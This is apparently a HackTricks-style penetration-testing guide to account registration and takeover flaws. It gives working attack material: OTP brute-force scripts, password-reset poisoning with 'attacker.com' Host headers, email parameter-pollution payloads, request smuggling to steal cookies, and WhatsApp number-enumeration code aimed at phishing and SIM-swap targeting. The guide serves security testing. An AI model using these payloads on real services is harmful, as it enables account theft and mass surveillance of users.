# Registration & Takeover Vulnerabilities

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- Try to generate using an existing username
- Check varying the email:
  - uppsercase
  - +1@
  - add some dot in the email
  - special characters in the email name (%00, %09, %20)
  - Put black characters after the email: `test@test.com a`
  - victim@gmail.com@attacker.com
  - victim@attacker.com@gmail.com
  - Try email provider canonicalization tricks (service-dependent):
    - Gmail ignores dots and subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
    - Some providers are case-insensitive in the local-part
    - Some providers accept unicode confusables. Try homoglyphs and soft hyphen `\u00AD` within the local-part
  - Abuse these to: bypass uniqueness checks, obtain duplicate accounts/workspace invites, or block victim sign‑ups (temporary DoS) while you prepare a takeover

### Username Enumeration

Check if you can figure out when a username has already been registered inside the application.

- Different error messages or HTTP status codes
- Timing differences (existing user may trigger lookup to IdP/DB)
- Registration form autofill of profile data for known emails
- Check team/invite flows: entering an email may reveal whether an account exists

### Password Policy

Creating a user check the password policy (check if you can use weak passwords).\
In that case you may try to bruteforce credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

When registered try to change the email and check if this change is correctly validated or can change it to arbitrary emails.

### More Checks

- Check if you can use **disposable emails** (mailinator, yopmail, 1secmail, etc.) or bypass the blocklist with subaddressing like `victim+mailinator@gmail.com`
- **Long** **password** (>200) leads to **DoS**
- **Check rate limits on account creation**
- Use username@**burp_collab**.net and analyze the **callback**
- If phone number verification is used, check phone parsing/injection edge cases

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–centric messengers expose a **presence oracle** whenever the client syncs contacts. Replaying WhatsApp’s discovery requests historically delivered **>100M lookups per hour**, enabling near-complete account enumerations.

**Attack workflow**

1. **Instrument an official client** to capture the address-book upload request (authenticated blob of normalized E.164 numbers). Replay it with attacker-generated numbers while reusing the same cookies/device token.
2. **Batch numbers per request**: WhatsApp accepts thousands of identifiers and returns registered/unregistered plus metadata (business, companion, etc.). Analyze responses offline to build target lists without messaging victims.
3. **Horizontally scale** enumeration with SIM banks, cloud devices, or residential proxies so per-account/IP/ASN throttling never triggers.

**Dialing-plan modeling**

Model each country’s dialing plan to skip invalid candidates. The NDSS dataset (`country-table.*`) lists country codes, adoption density, and platform split so you can prioritize high-hit ranges. Example seeding code:

```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
    candidate = prefix + "".join(suffix)
    enqueue(candidate)
```

Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- Slice censuses by country/OS/app type to find regions with weak SMS filtering or heavy WhatsApp Business adoption for localized social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows often verify ownership via a numeric OTP or a magic-link token. Typical flaws:

- Guessable or short OTP (4–6 digits) with no effective rate limiting or IP/device tracking. Try parallel guesses and header/IP rotation.
- OTP reuse across actions or accounts, or not bound to the specific user/action (e.g., same code works for login and signup, or works after email is changed).
- Multi-value smuggling: some backends accept multiple codes and verify if any matches. Try:
  - `code=000000&code=123456`
  - JSON arrays: `{"code":["000000","123456"]}`
  - Mixed parameter names: `otp=000000&one_time_code=123456`
  - Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguish wrong vs expired vs wrong-user codes by status/message/body length.
- Tokens not invalidated after success or after password/email change.
- Verification token not tied to user agent/IP allowing cross-origin completion from attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:

```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","code":"FUZZ"}' \
  -fr 'Invalid|Too many attempts' -mc all
```

Parallel/concurrent guessing to bypass sequential lockouts (use Turbo Intruder in Burp):

<details>
<summary>Turbo Intruder snippet to flood 6‑digit OTP attempts</summary>

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
    for code in range(0,1000000):
        body = '{"email":"victim@example.com","code":"%06d"}' % code
        engine.queue(target.req, body=body)


def handleResponse(req, interesting):
    if req.status != 401 and b'Invalid' not in req.response:
        table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

A powerful class of issues occurs when an attacker performs actions on the victim’s email before the victim creates their account, then regains access later.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
  - Attacker: registers a classic account with victim email and sets a password
  - Victim: later signs up with SSO (same email)
  - Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
  - Attacker: creates account and holds a long‑lived session (don’t log out)
  - Victim: recovers/sets password and uses the account
  - Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
  - Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
  - Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
  - Attacker: initiates email‑change to attacker mail and withholds confirmation
  - Victim: recovers the account and starts using it
  - Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
  - Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
  - Victim: signs up via classic route
  - Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
  - all other sessions and tokens are invalidated,
  - pending email/phone change capabilities are cancelled,
  - previously linked IdPs/emails/phones are re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
   `http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>

```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Attacker have to login with their account and go to the **Change password** feature.
2. Start the Burp Suite and Intercept the request
3. Send it to the repeater tab and edit the parameters : User ID/email\
   `powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

The password reset token should be randomly generated and unique every time.\
Try to determine if the token expire or if it’s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspect the server response and check for `resetToken`
3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Register on the system with a username identical to the victim’s username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
2. Request a password reset with your malicious username.
3. Use the token sent to your email and reset the victim password.
4. Connect to the victim account with the new password.

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
2. Leak the current **sessions cookie**
3. Authenticate as the user using the cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` with the goal of open redirect the victims to burpcollab and steal their cookies\
3. Final request could look like the following

```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```

Hackerone reports exploiting this bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Create a payload for the CSRF, e.g: “HTML form with auto submit for a password change”
2. Send the payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- Edit the JWT with another User ID / Email
- Check for weak JWT signature


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Some signup handlers perform an upsert when the provided email already exists. If the endpoint accepts a minimal body with an email and password and does not enforce ownership verification, sending the victim's email will overwrite their password pre-auth.

- Discovery: harvest endpoint names from bundled JS (or mobile app traffic), then fuzz base paths like /parents/application/v4/admin/FUZZ using ffuf/dirsearch.
- Method hints: a GET returning messages like "Only POST request is allowed." often indicates the correct verb and that a JSON body is expected.
- Minimal body observed in the wild:

```json
{"email":"victim@example.com","password":"New@12345"}
```

Example PoC:

```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```

Impact: Full Account Takeover (ATO) without any reset token, OTP, or email verification.

## References

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
